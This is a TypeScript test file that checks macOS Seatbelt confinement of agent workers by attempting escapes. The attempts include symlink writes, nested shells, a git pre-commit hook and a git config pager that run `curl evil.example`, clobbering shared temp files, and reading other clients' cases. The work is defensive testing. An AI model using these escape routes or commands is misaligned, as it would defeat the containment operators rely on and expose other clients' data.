import { execFile } from 'node:child_process'
import { mkdir, mkdtemp, readFile, stat, writeFile } from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import { promisify } from 'node:util'

import { describe, expect, it } from 'vitest'

import { assembleSeatbeltJailRoots } from './jail.ts'
import { compileSeatbeltProfile } from './profile.ts'
import { seatbeltAvailable, seatbeltCommand, writeSeatbeltProfile } from './wrap.ts'

const execFileAsync = promisify(execFile)

/**
 * Proves the TS-compiled profile is actually enforced by the kernel, not
 * merely byte-identical to the Go compiler's: under a real sandbox-exec, a
 * write into the read-only source is refused while a write into the granted
 * shadow succeeds. This is the load-bearing guarantee (rsc-urj); everything
 * else only checks the profile string. Darwin-only.
 */
describe('seatbelt enforcement (live sandbox-exec)', () => {
  it.skipIf(process.platform !== 'darwin')('kernel-enforces the compiled profile', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const base = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-enforce-'))
    const source = path.join(base, 'case-source')
    const shadow = path.join(base, 'shadow')
    const profileDir = path.join(base, 'jail')
    await Promise.all([mkdir(source), mkdir(shadow), mkdir(profileDir)])

    // Seed a source file to attempt to tamper with.
    const srcFile = path.join(source, 'intake.md')
    await writeFile(srcFile, 'original\n', 'utf8')

    const profile = await compileSeatbeltProfile([
      { name: 'case_source', path: source, access: 'ro' },
      { name: 'shadow', path: shadow, access: 'rw' },
    ])
    const profilePath = await writeSeatbeltProfile(profileDir, 'worker', profile)

    const run = async (shellCmd: string): Promise<boolean> => {
      const argv = seatbeltCommand(profilePath, shellCmd)
      try {
        await execFileAsync(argv[0]!, argv.slice(1))
        return true
      } catch {
        return false
      }
    }

    // Write into the granted shadow: must succeed.
    expect(await run(`echo derived > ${path.join(shadow, 'timeline.md')}`)).toBe(true)
    await expect(stat(path.join(shadow, 'timeline.md'))).resolves.toBeTruthy()

    // Direct write into the read-only source: must be refused at the syscall.
    expect(await run(`echo TAMPERED >> ${srcFile}`), 'jail is porous — direct write landed').toBe(false)

    // Shell-escape variant (the spike's load-bearing P2 probe): a nested
    // shell must not escape the jail either.
    expect(await run(`bash -c 'echo TAMPERED >> ${srcFile}'`), 'nested shell escaped the jail').toBe(false)

    // Source must be byte-identical after both refused attempts.
    expect(await readFile(srcFile, 'utf8')).toBe('original\n')
  })

  // The ro-hole guarantee (rsc-w0z): a broad writable root with read-only
  // HOLES punched into it. This is the acme shape — the case root is `.`
  // rw, but `.waypoint` (machine state) and `documents/inbox` (raw source PDFs)
  // are re-closed. It proves the load-bearing claim that an explicit deny
  // ordered AFTER a broad allow actually re-closes the subtree at the kernel
  // (SBPL last-match-wins), and that a writable scratch nested inside a hole
  // re-opens. If the kernel did NOT honor the ordering, the first assertion
  // below would fail loud and the ro-hole design would be off the table.
  it.skipIf(process.platform !== 'darwin')('kernel-enforces read-only holes in a writable root', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const caseRoot = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-holes-'))
    const runner = path.join(caseRoot, '.waypoint')
    const scratch = path.join(runner, 'scratch', 'route', 'task')
    const inbox = path.join(caseRoot, 'documents', 'inbox')
    const clientDir = path.join(caseRoot, 'client')
    const profileDir = path.join(runner, 'seatbelt')
    await Promise.all([
      mkdir(scratch, { recursive: true }),
      mkdir(inbox, { recursive: true }),
      mkdir(clientDir),
      mkdir(profileDir, { recursive: true }),
    ])

    // Seed protected files inside the holes to attempt to tamper with.
    const configFile = path.join(runner, 'config.yaml')
    const rawPdf = path.join(inbox, 'raw.pdf')
    await Promise.all([writeFile(configFile, 'runtime: worker\n', 'utf8'), writeFile(rawPdf, '%PDF fake\n', 'utf8')])

    // The acme map: case root rw, .waypoint + documents/inbox ro holes,
    // plus the baseline scratch rw nested inside the .waypoint hole.
    const profile = await compileSeatbeltProfile([
      { name: 'case_work', path: caseRoot, access: 'rw' },
      { name: 'machine_state', path: runner, access: 'ro' },
      { name: 'raw_source', path: inbox, access: 'ro' },
      { name: 'scratch', path: scratch, access: 'rw' },
    ])
    const profilePath = await writeSeatbeltProfile(profileDir, 'holes', profile)

    const run = async (shellCmd: string): Promise<boolean> => {
      const argv = seatbeltCommand(profilePath, shellCmd)
      try {
        await execFileAsync(argv[0]!, argv.slice(1))
        return true
      } catch {
        return false
      }
    }

    // A write into an ordinary case area (client/) is granted by the case-root allow.
    expect(await run(`echo intake > ${path.join(clientDir, 'contact.md')}`)).toBe(true)
    await expect(stat(path.join(clientDir, 'contact.md'))).resolves.toBeTruthy()

    // The scratch dir, nested inside the .waypoint hole, re-opens (deepest rule wins).
    expect(await run(`echo work > ${path.join(scratch, 'notes.md')}`), 'scratch re-open failed').toBe(true)
    await expect(stat(path.join(scratch, 'notes.md'))).resolves.toBeTruthy()

    // The .waypoint hole re-closes: a write to machine state is refused even
    // though the enclosing case root is writable. THIS is the load-bearing
    // proof that deny-after-allow holds at the kernel.
    expect(await run(`echo HACKED >> ${configFile}`), '.waypoint hole is porous — write landed').toBe(false)
    expect(await run(`bash -c 'echo HACKED >> ${configFile}'`), 'nested shell escaped the .waypoint hole').toBe(false)

    // The documents/inbox hole re-closes: raw source PDFs cannot be tampered.
    expect(await run(`echo HACKED >> ${rawPdf}`), 'inbox hole is porous — write landed').toBe(false)

    // Both holes byte-identical after the refused attempts.
    expect(await readFile(configFile, 'utf8')).toBe('runtime: worker\n')
    expect(await readFile(rawPdf, 'utf8')).toBe('%PDF fake\n')
  })

  /**
   * SYMLINK ESCAPE — the test that catches a string-prefix jail (technique
   * borrowed from agent-space's app/tests/sandbox.test.ts, 2026-07-16).
   *
   * Every assertion above attacks the boundary with a path that LOOKS like it
   * is outside. This one attacks with a path that looks like it is INSIDE: the
   * worker creates a symlink within its own writable root pointing out, then
   * writes through it. A jail that string-matches the requested path would
   * happily allow it — the write is "under" a granted subpath. The claim under
   * test is that Seatbelt resolves the REAL path before deciding.
   *
   * We canonicalize roots at profile-compile time (profile.test.ts), but that
   * proves nothing here: this link is created at RUN time by the jailed process
   * itself, long after the profile is written. Only the kernel can refuse it.
   */
  it.skipIf(process.platform !== 'darwin')('kernel refuses a write through a symlink out of the jail', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const base = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-symlink-'))
    const outside = path.join(base, 'outside')
    const shadow = path.join(base, 'shadow')
    const profileDir = path.join(base, 'jail')
    await Promise.all([mkdir(outside), mkdir(shadow), mkdir(profileDir)])

    const secret = path.join(outside, 'secret.txt')
    await writeFile(secret, 'top secret\n', 'utf8')

    // Only the shadow is writable. `outside` is granted nothing at all.
    const profile = await compileSeatbeltProfile([{ name: 'shadow', path: shadow, access: 'rw' }])
    const profilePath = await writeSeatbeltProfile(profileDir, 'symlink', profile)

    const run = async (shellCmd: string): Promise<boolean> => {
      const argv = seatbeltCommand(profilePath, shellCmd)
      try {
        await execFileAsync(argv[0]!, argv.slice(1))
        return true
      } catch {
        return false
      }
    }

    // POSITIVE CONTROL — without it this test passes vacuously: a profile that
    // granted nothing at all would refuse the escape too, and prove nothing.
    expect(await run(`echo ok > ${path.join(shadow, 'control.txt')}`), 'profile grants nothing — the escape assertions below would be vacuous').toBe(true)

    // The jailed process builds its own escape hatch INSIDE its granted root.
    const link = path.join(shadow, 'escape-link')
    expect(await run(`ln -s ${outside} ${link}`), 'could not create the symlink to test with').toBe(true)

    // Write through it. Every path component here is under the granted shadow.
    expect(await run(`echo pwned > ${path.join(link, 'sym.txt')}`), 'JAIL IS POROUS — write through a symlink escaped').toBe(false)
    // And clobbering an existing file outside, through the link.
    expect(await run(`echo pwned > ${path.join(link, 'secret.txt')}`), 'JAIL IS POROUS — symlink clobbered a file outside').toBe(false)

    // The proof that matters is the bytes, not the exit code: assert nothing
    // landed, rather than that the command merely errored.
    await expect(stat(path.join(outside, 'sym.txt'))).rejects.toThrow()
    expect(await readFile(secret, 'utf8')).toBe('top secret\n')
  })

  /**
   * rsc-dqj — the git-hook escape, live regression test.
   *
   * Before the mandatory holes existed, this exact scenario SUCCEEDED against
   * the shipped acme map: `case_work: . (rw)` puts `.git` inside a
   * writable root, so a worker could write `.git/hooks/pre-commit`.
   *
   * That is not a contained write. The hook never runs in the jail — it runs on
   * the HOST, unjailed, as the operator, with a full environment and network,
   * the next time anyone types `git commit` in that vault. Our evidence model
   * requires real commits, so we ship the detonator ourselves. The worker
   * plants; the human triggers.
   *
   * Note what is NOT asserted: that the worker cannot write `.git` at all. It
   * must — `git commit` writes objects, refs, index and logs. Only the
   * execution surfaces are closed.
   */
  it.skipIf(process.platform !== 'darwin')('kernel refuses a jailed worker planting a git hook (rsc-dqj)', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const caseRoot = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-githook-'))
    await Promise.all([
      mkdir(path.join(caseRoot, '.git', 'hooks'), { recursive: true }),
      mkdir(path.join(caseRoot, '.git', 'objects'), { recursive: true }),
      mkdir(path.join(caseRoot, '.waypoint'), { recursive: true }),
      mkdir(path.join(caseRoot, 'documents', 'inbox'), { recursive: true }),
    ])
    await writeFile(path.join(caseRoot, '.git', 'config'), '[core]\n\tbare = false\n', 'utf8')

    // EXACTLY the shipped acme access map — note it never mentions .git.
    // The holes must appear anyway; that is the point of them being mandatory.
    const profile = await compileSeatbeltProfile(
      assembleSeatbeltJailRoots({
        projectRoot: caseRoot,
        roots: {
          case_work: { path: '.', access: 'rw' },
          raw_source: { path: 'documents/inbox', access: 'ro' },
          machine_state: { path: '.waypoint', access: 'ro' },
        },
        access: { case_work: 'rw', raw_source: 'ro', machine_state: 'ro' },
        scratchDir: path.join(caseRoot, '.waypoint', 'scratch', 'r', 't'),
        tmpDir: path.join(caseRoot, '.waypoint', 'tmp', 'r', 't'),
      }),
    )
    const profilePath = await writeSeatbeltProfile(caseRoot, 'githook', profile)

    const run = async (shellCmd: string): Promise<boolean> => {
      const argv = seatbeltCommand(profilePath, shellCmd)
      try {
        await execFileAsync(argv[0]!, argv.slice(1))
        return true
      } catch {
        return false
      }
    }

    // POSITIVE CONTROL: ordinary case work is still writable, so the refusals
    // below mean something. And .git itself stays writable, or commits break.
    expect(await run(`echo note > ${path.join(caseRoot, 'client-notes.md')}`), 'case work is not writable — refusals below are vacuous').toBe(true)
    expect(await run(`echo obj > ${path.join(caseRoot, '.git', 'objects', 'aa')}`), 'git objects unwritable — commits would break').toBe(true)

    // THE ESCAPE, refused.
    const hook = path.join(caseRoot, '.git', 'hooks', 'pre-commit')
    expect(await run(`printf '#!/bin/sh\\ncurl evil.example\\n' > ${hook}`), 'ESCAPE — worker planted a git hook').toBe(false)
    expect(await run(`bash -c 'echo x > ${hook}'`), 'ESCAPE — nested shell planted a git hook').toBe(false)
    await expect(stat(hook)).rejects.toThrow()

    // git config is the same class: core.pager / aliases / filter.* all execute.
    expect(await run(`echo '[core]\\n\\tpager = sh -c "curl evil.example"' > ${path.join(caseRoot, '.git', 'config')}`), 'ESCAPE — worker rewrote git config').toBe(false)
    expect(await readFile(path.join(caseRoot, '.git', 'config'), 'utf8')).toBe('[core]\n\tbare = false\n')
  })

  /**
   * rsc-g0p — the shared system temp, live regression test.
   *
   * The rsc-w0z jail granted `os.tmpdir()` and `/tmp` rw as a "viability"
   * baseline. On macOS os.tmpdir() is /private/var/folders/<...>/T — not a
   * private scratch dir but EVERY application's temp space. So a worker the
   * operator was told is confined to the case folder could read and clobber any
   * other app's temp files: caches, sockets, half-written documents, and the
   * temp files of a CONCURRENT worker on a different case.
   *
   * The fix reparents the attempt's temp into `.waypoint/tmp/<route>/<task>` and
   * points TMPDIR at it. This test is the one that would fail if someone ever
   * restores the baseline grant "for viability".
   *
   * The positive control is load-bearing in a way worth naming: a worker with
   * NO writable temp at all would also pass the refusal assertions, while being
   * broken. So the control asserts the replacement actually works first.
   */
  it.skipIf(process.platform !== 'darwin')('kernel refuses a jailed worker writing the SHARED system temp (rsc-g0p)', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const caseRoot = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-temp-'))
    const tmpDir = path.join(caseRoot, '.waypoint', 'tmp', 'r', 't')
    await mkdir(tmpDir, { recursive: true })

    // A bystander's temp file — stands in for every other app's scratch space,
    // and for a concurrent worker on a DIFFERENT case. It sits directly in the
    // shared temp, not under our case root.
    const bystander = path.join(await mkdtemp(path.join(os.tmpdir(), 'other-app-')), 'session.dat')
    await writeFile(bystander, 'someone else\n', 'utf8')

    const profile = await compileSeatbeltProfile(
      assembleSeatbeltJailRoots({
        projectRoot: caseRoot,
        roots: { case_work: { path: '.', access: 'rw' } },
        access: { case_work: 'rw' },
        scratchDir: path.join(caseRoot, '.waypoint', 'scratch', 'r', 't'),
        tmpDir,
      }),
    )
    const profilePath = await writeSeatbeltProfile(caseRoot, 'temp', profile)

    const run = async (shellCmd: string): Promise<boolean> => {
      const argv = seatbeltCommand(profilePath, shellCmd)
      try {
        await execFileAsync(argv[0]!, argv.slice(1))
        return true
      } catch {
        return false
      }
    }

    // POSITIVE CONTROL: the attempt's OWN temp works — this is what TMPDIR
    // points at, so a tool honoring TMPDIR is unaffected by the refusals below.
    expect(await run(`echo scratch > ${path.join(tmpDir, 'work.tmp')}`), 'the attempt has no usable temp — the refusals below are vacuous').toBe(true)
    await expect(stat(path.join(tmpDir, 'work.tmp'))).resolves.toBeTruthy()

    // THE HOLE, closed: the shared temp is not writable, by any of its names.
    expect(await run(`echo pwned > ${bystander}`), "ESCAPE — worker clobbered another app's temp file").toBe(false)
    expect(await run(`bash -c 'echo pwned > ${bystander}'`), "ESCAPE — nested shell clobbered another app's temp file").toBe(false)
    expect(await run(`echo pwned > ${path.join(os.tmpdir(), 'planted-by-worker')}`), 'ESCAPE — worker wrote into os.tmpdir()').toBe(false)
    expect(await run(`echo pwned > /tmp/planted-by-worker`), 'ESCAPE — worker wrote into /tmp').toBe(false)

    // Bytes, not exit codes.
    expect(await readFile(bystander, 'utf8')).toBe('someone else\n')
    await expect(stat(path.join(os.tmpdir(), 'planted-by-worker'))).rejects.toThrow()
  })

  /**
   * rsc-452 — the file-claim report seam, live regression test.
   *
   * The worker reports by writing ONE file: .waypoint/claims/<route>/<task>.json.
   * That is its only channel to say "finished" — it has no route to Postgres by
   * design. So the jail has two jobs at once here, and both are load-bearing:
   *
   *   1. The claim path MUST be writable, through an OTHERWISE read-only .waypoint
   *      (machine_state: .waypoint ro). If the grant did not re-open it, EVERY
   *      real dispatch would die at report time — a total functional break, the
   *      exact shape of the rsc-wxk .git/config bug that a profile-string test
   *      would have missed.
   *   2. The grant must be NARROW: it re-opens the attempt's own route dir, not
   *      all of .waypoint and not a sibling route's claim. A claim seam that widened
   *      .waypoint back to writable would hand the worker the Waypoint's own state.
   *
   * Same shape as the git-hook and shared-temp tests: a real sandbox-exec, and
   * the proof is the bytes on disk, not the exit code.
   */
  it.skipIf(process.platform !== 'darwin')('kernel lets a jailed worker write its claim but nothing else under a read-only .waypoint (rsc-452)', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const caseRoot = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-claim-'))
    const claimDir = path.join(caseRoot, '.waypoint', 'claims', 'r')
    await Promise.all([
      mkdir(claimDir, { recursive: true }),
      mkdir(path.join(caseRoot, '.waypoint', 'scratch', 'r', 't'), { recursive: true }),
      mkdir(path.join(caseRoot, '.waypoint', 'tmp', 'r', 't'), { recursive: true }),
    ])

    // The shipped acme shape: case work rw, .waypoint ro (machine_state) —
    // plus the attempt's claim dir re-opened rw, the way worker-runtime stages it.
    const profile = await compileSeatbeltProfile(
      assembleSeatbeltJailRoots({
        projectRoot: caseRoot,
        roots: {
          case_work: { path: '.', access: 'rw' },
          machine_state: { path: '.waypoint', access: 'ro' },
        },
        access: { case_work: 'rw', machine_state: 'ro' },
        scratchDir: path.join(caseRoot, '.waypoint', 'scratch', 'r', 't'),
        tmpDir: path.join(caseRoot, '.waypoint', 'tmp', 'r', 't'),
        claimDir,
      }),
    )
    const profilePath = await writeSeatbeltProfile(caseRoot, 'claim', profile)

    const run = async (shellCmd: string): Promise<boolean> => {
      const argv = seatbeltCommand(profilePath, shellCmd)
      try {
        await execFileAsync(argv[0]!, argv.slice(1))
        return true
      } catch {
        return false
      }
    }

    // POSITIVE: the worker's ONE report channel works, through a read-only .waypoint.
    const claimFile = path.join(claimDir, 't.json')
    expect(await run(`echo '{"status":"finished"}' > ${claimFile}`), 'the claim is unwritable — every real dispatch would die at report time').toBe(true)
    expect(await readFile(claimFile, 'utf8')).toContain('finished')

    // NEGATIVE: the grant is the route dir, not all of .waypoint/claims, and not
    // the rest of .waypoint. Both parents exist and are read-only.
    expect(await run(`echo pwned > ${path.join(caseRoot, '.waypoint', 'claims', 'pwned.txt')}`), 'ESCAPE — the claim grant widened to all of .waypoint/claims').toBe(false)
    expect(await run(`echo pwned > ${path.join(caseRoot, '.waypoint', 'pwned.txt')}`), 'ESCAPE — the claim grant re-opened the rest of .waypoint').toBe(false)

    // Bytes, not exit codes.
    await expect(stat(path.join(caseRoot, '.waypoint', 'claims', 'pwned.txt'))).rejects.toThrow()
    await expect(stat(path.join(caseRoot, '.waypoint', 'pwned.txt'))).rejects.toThrow()
  })
})

/**
 * Read confinement (rsc, 2026-08-06). The jail was write-only for its whole
 * life: every dispatched agent could read every document in the case and every
 * other case on the machine, whatever its recipe declared. That is not a
 * theoretical hole — a medical-layer extractor told in its prompt to read the
 * faithful shadows was free to re-read the source PDFs instead, and the
 * previous generation of that pipeline did exactly that, which is why its
 * shadows are summaries.
 *
 * An undeclared sibling must be unreadable AT THE KERNEL, not merely
 * un-granted in a prompt. Darwin-only.
 */
describe('seatbelt read confinement (live sandbox-exec)', () => {
  it.skipIf(process.platform !== 'darwin')('refuses reads outside the declared roots', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const base = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-read-'))
    const declared = path.join(base, 'shadows')
    const undeclared = path.join(base, 'inbox')
    const profileDir = path.join(base, 'jail')
    await Promise.all([mkdir(declared), mkdir(undeclared), mkdir(profileDir)])
    await writeFile(path.join(declared, 'doc.md'), 'shadow body\n', 'utf8')
    await writeFile(path.join(undeclared, 'doc.pdf'), 'pdf body\n', 'utf8')

    const profile = await compileSeatbeltProfile([{ name: 'shadows', path: declared, access: 'ro' }], {
      dataRoots: [base],
    })
    const profilePath = await writeSeatbeltProfile(profileDir, 'read-confinement', profile)
    const run = (script: string) => {
      const argv = seatbeltCommand(profilePath, script)
      return execFileAsync(argv[0]!, argv.slice(1))
    }

    // The declared root reads.
    const { stdout } = await run(`cat ${JSON.stringify(path.join(declared, 'doc.md'))}`)
    expect(stdout).toContain('shadow body')

    // The undeclared sibling does not — by path, by traversal, and by symlink.
    const pdf = path.join(undeclared, 'doc.pdf')
    await expect(run(`cat ${JSON.stringify(pdf)}`)).rejects.toThrow()
    await expect(run(`ls ${JSON.stringify(undeclared)}`)).rejects.toThrow()
    await expect(
      run(`cat ${JSON.stringify(path.join(declared, '..', 'inbox', 'doc.pdf'))}`),
    ).rejects.toThrow()
    const link = path.join(profileDir, 'link.pdf')
    await expect(
      run(`ln -sf ${JSON.stringify(pdf)} ${JSON.stringify(link)}; cat ${JSON.stringify(link)}`),
    ).rejects.toThrow()

    // The agent CLI must still be able to start: system paths stay readable.
    const { stdout: sys } = await run('ls /usr/bin/env && echo SYSTEM_OK')
    expect(sys).toContain('SYSTEM_OK')
  })

  // Cases are SIBLINGS. Confining reads to the project root alone left an agent
  // in one case able to read every document in every other case on the machine
  // — cross-client exposure, and it survived the first version of this fix.
  // Traversal into the project must still work, which needs read-METADATA on
  // the enclosing directory: enough to resolve a path through it, not enough to
  // list it, so sibling case NAMES stay hidden too.
  it.skipIf(process.platform !== 'darwin')('refuses reads of a sibling project', async (ctx) => {
    try {
      await seatbeltAvailable()
    } catch {
      ctx.skip()
      return
    }

    const cases = await mkdtemp(path.join(os.tmpdir(), 'seatbelt-sibling-'))
    const mine = path.join(cases, 'case-a')
    const theirs = path.join(cases, 'case-b')
    const records = path.join(mine, 'records')
    await Promise.all([mkdir(records, { recursive: true }), mkdir(theirs, { recursive: true })])
    await writeFile(path.join(records, 'ok.md'), 'my record\n', 'utf8')
    await writeFile(path.join(theirs, 'secret.md'), 'their client\n', 'utf8')

    const profile = await compileSeatbeltProfile([{ name: 'records', path: records, access: 'ro' }], {
      dataRoots: [mine, cases],
      cwdRoot: mine,
    })
    const profilePath = await writeSeatbeltProfile(await mkdtemp(path.join(os.tmpdir(), 'sb-')), 'sibling', profile)
    const run = (script: string) => {
      const argv = seatbeltCommand(profilePath, script)
      return execFileAsync(argv[0]!, argv.slice(1))
    }

    // Traversal into my own project still works, and my declared root reads.
    const { stdout } = await run(`cd ${JSON.stringify(mine)} && pwd && cat records/ok.md`)
    expect(stdout).toContain('my record')

    // The sibling project is closed, and so is the list of sibling names.
    await expect(run(`cat ${JSON.stringify(path.join(theirs, 'secret.md'))}`)).rejects.toThrow()
    await expect(run(`ls ${JSON.stringify(theirs)}`)).rejects.toThrow()
    await expect(run(`ls ${JSON.stringify(cases)}`)).rejects.toThrow()
  })
})
